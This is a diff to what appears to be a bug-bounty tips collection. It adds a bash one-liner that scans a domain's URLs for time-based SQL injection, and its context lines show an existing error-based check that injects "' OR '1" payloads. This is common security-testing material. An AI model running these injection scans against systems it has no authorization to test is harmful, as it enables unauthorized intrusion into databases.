@@ -197,6 +197,12 @@ findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls 
 grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
 ```
 
+## SQLi-TimeBased scanner
+> @slv0d
+```bash
+gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
+```
+
 ## Recon to search SSRF Test
 > [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
 ```bash
